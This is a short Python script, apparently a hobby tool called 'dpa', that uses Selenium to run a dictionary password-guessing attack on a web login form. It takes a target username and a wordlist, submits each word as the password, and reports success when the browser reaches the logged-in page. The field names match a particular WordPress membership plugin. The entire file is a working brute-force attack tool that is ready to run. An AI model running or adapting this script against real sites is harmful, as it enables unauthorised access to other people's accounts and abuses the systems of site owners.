from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from time import sleep
import sys

# only for design
def loading():
    print("Loading")
    for i in range(15):
        sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()


print("Welcome to dpa (v1.0.0)!")
loading()
print()

# get info
url_to_login = input("What is the url for login?\n")
username = input("What is the username?\n")
logged_in_url = input("What is the url that I will be redirected to after logging in?\n")
dictionary_address = input("Enter address of dictionary: ")

# set browser
s = Service("C:\\Users\\hsn\\Desktop\\coding\\dpa\\chromedriver.exe") # you need to replace it according to your own system
driver = webdriver.Chrome(service=s)

dictionary = open(dictionary_address)

print("Founding")
for line in dictionary:
    # only for design
    sys.stdout.write(".")
    sys.stdout.flush()

    driver.get(url_to_login)
    setusername = driver.find_element(by=By.NAME, value="username-80") # you need to replace number of it (80) according to your own site
    setusername.send_keys(username)
    setpassword = driver.find_element(by=By.ID, value="user_password-80") # you need to replace number of it (80) according to your own site
    setpassword.send_keys(line[:-1])
    submit = driver.find_element(by=By.ID, value="um-submit-btn")
    submit.click()

    # check the correctness of the password
    if logged_in_url == driver.current_url:
        print()
        print(f"Ok! I found the password?! It's:\n{line}")
        break
